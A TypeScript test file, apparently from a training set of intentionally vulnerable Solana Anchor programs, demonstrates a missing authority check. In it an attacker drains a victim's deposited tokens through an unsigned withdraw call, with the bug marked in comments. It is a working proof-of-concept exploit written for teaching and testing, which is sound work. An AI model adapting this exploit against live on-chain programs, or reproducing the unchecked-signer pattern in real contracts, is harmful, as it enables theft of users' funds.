/**
 * VULN 01 — Missing authority check on withdraw.
 *
 * The withdraw instruction never proves the caller owns the balance account:
 * no signer, no has_one, no PDA binding. The attacker simply points the
 * instruction at the victim's balance PDA and drains it into their own ATA.
 */
import { assert } from "chai";
import {
  PROG_IDS, provider, anchorProgram, findPda, seedsBuf, airdrop, newFundedKeypair,
  createMint, createAccount, mintTo, tokenBalance, sendSelfSigned, TOKEN_PROGRAM_ID, SystemProgram,
  BN,
} from "./util";

describe("vuln01 missing authority check", () => {
  const program = anchorProgram("vuln01_missing_signer", PROG_IDS.vuln01);

  const mint = {} as any;
  const vaultPda = findPda([seedsBuf("vault")[0]], PROG_IDS.vuln01)[0];
  const balancePdaOf = (user: any) => findPda([seedsBuf("balance")[0], user.publicKey.toBytes()], PROG_IDS.vuln01)[0];

  let victim: any, attacker: any;
  let victimAta: any, attackerAta: any;
  let victimBalance: any;

  before(async () => {
    await airdrop(provider.wallet.publicKey, 50);
    victim = await newFundedKeypair();
    attacker = await newFundedKeypair();
    console.log("victim:", victim.publicKey.toString());
    console.log("attacker:", attacker.publicKey.toString());
    console.log("provider wallet:", provider.wallet.publicKey.toString());

    mint.key = await createMint(provider.connection, provider.wallet.payer, provider.wallet.publicKey, null, 6);
    victimAta = await createAccount(provider.connection, provider.wallet.payer, mint.key, victim.publicKey);
    attackerAta = await createAccount(provider.connection, provider.wallet.payer, mint.key, attacker.publicKey);
    await mintTo(provider.connection, provider.wallet.payer, mint.key, victimAta, provider.wallet.publicKey, 1000);

    await program.methods
      .initialize()
      .accounts({ mint: mint.key })
      .rpc();
    victimBalance = balancePdaOf(victim);

    await program.methods
      .deposit(new BN(1000))
      .accounts({ userBalance: victimBalance, user: victim.publicKey, userAta: victimAta, vault: vaultPda })
      .signers([victim])
      .rpc();
  });

  it("victim balance is intact before the attack", async () => {
    const bal = await program.account.userBalance.fetch(victimBalance);
    assert.equal(bal.amount.toString(), "1000");
  });

  it("attacker drains the victim balance WITHOUT the victim signature", async () => {
    // No victim keypair anywhere in this call. Only the attacker pays/signs.
    await sendSelfSigned(
      [
        await program.methods
          .withdraw(new BN(1000))
          .accounts({
            userBalance: victimBalance,
            authority: attacker.publicKey, // BUG: unchecked, not a signer
            destinationAta: attackerAta, // BUG: not tied to the balance owner
            vault: vaultPda,
          })
          .instruction(),
      ],
      attacker,
    );

    assert.equal((await tokenBalance(attackerAta)).toString(), "1000");
    assert.equal((await tokenBalance(vaultPda)).toString(), "0");
  });
});
